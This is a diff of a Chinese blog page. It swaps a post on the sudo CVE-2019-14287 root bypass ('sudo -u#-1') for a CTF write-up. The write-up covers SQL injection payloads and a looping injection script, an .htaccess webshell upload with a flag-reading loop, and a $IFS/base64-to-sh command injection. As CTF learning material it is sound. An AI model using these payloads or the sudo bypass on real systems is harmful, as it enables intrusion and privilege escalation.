@@ -94,17 +94,17 @@
 
 
 
-<meta name="description" content="基础知识sudo命令 1-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码  配置文件 /etc/sudoers  管理员通常通过修改该文件来限制其他用户可以执行的命令 123# User privilege specificationroot	ALL=(ALL:A">
+<meta name="description" content="WEBsql1union select联合查询绕过 根据后台语句select * from &amp;#39;$name&amp;#39; 1’ union select 1,’admin’,’md5(123)’ &amp;amp;pw=123 sql2宽字节 + 报错 + 未知列名 1search.php?name=admin%df&amp;apos; and (seselectlect 1 from  (seselectle">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sudo提权绕过CVE-2019-14287">
-<meta property="og:url" content="http://yoursite.com/2019/10/26/sudo提权绕过CVE-2019-14287/index.html">
+<meta property="og:title" content="GXY_CTF记录">
+<meta property="og:url" content="http://yoursite.com/2019/12/22/GXY-CTF记录/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="基础知识sudo命令 1-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码  配置文件 /etc/sudoers  管理员通常通过修改该文件来限制其他用户可以执行的命令 123# User privilege specificationroot	ALL=(ALL:A">
+<meta property="og:description" content="WEBsql1union select联合查询绕过 根据后台语句select * from &amp;#39;$name&amp;#39; 1’ union select 1,’admin’,’md5(123)’ &amp;amp;pw=123 sql2宽字节 + 报错 + 未知列名 1search.php?name=admin%df&amp;apos; and (seselectlect 1 from  (seselectle">
 <meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2019-10-26T08:01:49.382Z">
+<meta property="og:updated_time" content="2019-12-22T01:14:04.496Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sudo提权绕过CVE-2019-14287">
-<meta name="twitter:description" content="基础知识sudo命令 1-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码  配置文件 /etc/sudoers  管理员通常通过修改该文件来限制其他用户可以执行的命令 123# User privilege specificationroot	ALL=(ALL:A">
+<meta name="twitter:title" content="GXY_CTF记录">
+<meta name="twitter:description" content="WEBsql1union select联合查询绕过 根据后台语句select * from &amp;#39;$name&amp;#39; 1’ union select 1,’admin’,’md5(123)’ &amp;amp;pw=123 sql2宽字节 + 报错 + 未知列名 1search.php?name=admin%df&amp;apos; and (seselectlect 1 from  (seselectle">
 
 
 
@@ -133,13 +133,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/10/26/sudo提权绕过CVE-2019-14287/">
+  <link rel="canonical" href="http://yoursite.com/2019/12/22/GXY-CTF记录/">
 
 
 
 
 
-  <title>sudo提权绕过CVE-2019-14287 | Hexo</title>
+  <title>GXY_CTF记录 | Hexo</title>
   
 
 
@@ -262,7 +262,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/26/sudo提权绕过CVE-2019-14287/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/GXY-CTF记录/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -279,7 +279,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sudo提权绕过CVE-2019-14287</h1>
+          <h1 class="post-title" itemprop="name headline">GXY_CTF记录</h1>
         
 
         <div class="post-meta">
@@ -291,8 +291,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-26T15:28:29+08:00">
-                2019-10-26
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-12-22T08:58:36+08:00">
+                2019-12-22
               </time>
             
 
@@ -329,20 +329,37 @@
       
 
       
-        <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>sudo命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码</span><br></pre></td></tr></table></figure>
+        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h2><p>union select联合查询绕过</p>
+<p>根据后台语句<code>select * from &#39;$name&#39;</code></p>
+<p>1’ union select 1,’admin’,’md5(123)’ &amp;pw=123</p>
+<h2 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h2><p>宽字节 + 报错 + 未知列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?name=admin%df&apos; and (seselectlect 1 from  (seselectlect count(*),concat((selselectect e.2 from (selselectect * from (selselectect 1)a,(selselectect 2)b ununionion selselectect * from f14g)e limit 2 offset 0;),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&amp;pw=3</span><br></pre></td></tr></table></figure>
 
-<p>配置文件</p>
-<p>/etc/sudoers  管理员通常通过修改该文件来限制其他用户可以执行的命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># User privilege specification</span></span><br><span class="line">root	ALL=(ALL:ALL) ALL</span><br><span class="line"><span class="built_in">test</span> ALL=(ALL, !root) /usr/bin/whoami</span><br></pre></td></tr></table></figure>
+<p>最后的payload 改数据的条数 然后base64解码一下，写的一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">res=requests.session()</span><br><span class="line">url=<span class="string">"http://183.129.189.60:10006/search.php?name=admin\%df' and (seselectlect 1 from  (seselectlect count(*),concat((selselectect e.2 from (selselectect * from (selselectect 1)a,(selselectect 2)b ununionion selselectect * from f14g)e limit 1 offset %s),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&amp;pw=3"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    url=<span class="string">"http://183.129.189.60:10006/search.php?name=admin%df' and (seselectlect 1 from  (seselectlect count(*),concat((selselectect e.2 from (selselectect * from (selselectect 1)a,(selselectect 2)b ununionion selselectect * from f14g)e limit 1 offset "</span>+str(i)+<span class="string">"),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&amp;pw=3"</span></span><br><span class="line">    re1=res.get(url=url)</span><br><span class="line">    te=re.findall(<span class="string">r"Error: Duplicate entry '(.*?)1'"</span>)</span><br><span class="line">    print(re1.text)</span><br></pre></td></tr></table></figure>
 
-<p>这里限制test用户以root权限去执行whoami</p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:~$ sudo su <span class="built_in">test</span></span><br><span class="line">$ sudo whoami</span><br><span class="line">[sudo] <span class="built_in">test</span> 的密码： </span><br><span class="line">对不起，用户 <span class="built_in">test</span> 无权以 root 的身份在 ddd 上执行 /usr/bin/whoami。</span><br><span class="line">正常情况下，<span class="built_in">test</span>用户已经被admin限制，不能执行whoami</span><br><span class="line"></span><br><span class="line">看一下版本</span><br><span class="line">$ sudo -V</span><br><span class="line">Sudo 版本 1.8.21p2</span><br><span class="line">Sudoers 策略插件版本 1.8.21p2</span><br><span class="line">Sudoers 文件语法版本 46</span><br><span class="line">Sudoers I/O plugin version 1.8.21p2</span><br></pre></td></tr></table></figure>
+<p>有的返回结果里面有个1 而有的没有 所以正则提取这里，没有弄</p>
+<p>把结果挨个解码  然后找flag </p>
+<h2 id="sql3"><a href="#sql3" class="headerlink" title="sql3"></a>sql3</h2><p>没思路</p>
+<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>上传一个.htaccess</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">把shell.jpg解析为php</span><br></pre></td></tr></table></figure>
 
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -u<span class="comment">#-1 whoami</span></span><br><span class="line">[sudo] <span class="built_in">test</span> 的密码： </span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">sudo -u<span class="comment">#4294967295 whoami</span></span><br><span class="line">sudo -u<span class="comment">#-1 whoami</span></span><br></pre></td></tr></table></figure>
+<p>在传一个shell.jpg</p>
+<p>需要不断上传，服务端会不停的删，套娃题 先传.htaccesss 后传图片</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">res=requests.session()</span><br><span class="line">url=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    re=requests.post(url=url,data=&#123;<span class="string">"shell"</span>:<span class="string">"var_dump(readfile('/flag'));"</span>&#125;)</span><br><span class="line">    print(re.text)</span><br></pre></td></tr></table></figure>
 
-<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>sudo&lt;1.8.28版本</p>
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.freebuf.com/vuls/217089.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/217089.html</a></p>
+<p>不停的访问</p>
+<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>命令注入绕过</p>
+<p>过滤了空格 单引号 {} </p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="套娃题"><a href="#套娃题" class="headerlink" title="套娃题"></a>套娃题</h2><p>无参数执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h2><p>伪加密  改一下文件头</p>
+<h2 id="gakki"><a href="#gakki" class="headerlink" title="gakki"></a>gakki</h2><p>foremost分离  爆破压缩包密码  词频分析</p>
+<p>不知道咋回事 我的压缩包密码从来就没有爆出来过</p>
 
       
     </div>
@@ -367,8 +384,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/22/BUU记录/" rel="next" title>
-                <i class="fa fa-chevron-left"></i> 
+              <a href="/2019/12/19/BUU-MISC/" rel="next" title="BUU-MISC">
+                <i class="fa fa-chevron-left"></i> BUU-MISC
               </a>
             
           </div>
@@ -376,10 +393,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/29/Angularjs模板注入/" rel="prev" title="Angularjs模板注入">
-                Angularjs模板注入 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -493,7 +506,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">2.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过"><span class="nav-number">3.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#限制"><span class="nav-number">4.</span> <span class="nav-text">限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql1"><span class="nav-number">1.1.</span> <span class="nav-text">sql1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql2"><span class="nav-number">1.2.</span> <span class="nav-text">sql2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql3"><span class="nav-number">1.3.</span> <span class="nav-text">sql3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#upload"><span class="nav-number">1.4.</span> <span class="nav-text">upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ping"><span class="nav-number">1.5.</span> <span class="nav-text">ping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#套娃题"><span class="nav-number">1.6.</span> <span class="nav-text">套娃题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#佛系青年"><span class="nav-number">2.1.</span> <span class="nav-text">佛系青年</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gakki"><span class="nav-number">2.2.</span> <span class="nav-text">gakki</span></a></li></ol></li></ol></div>
             
 
           </div>
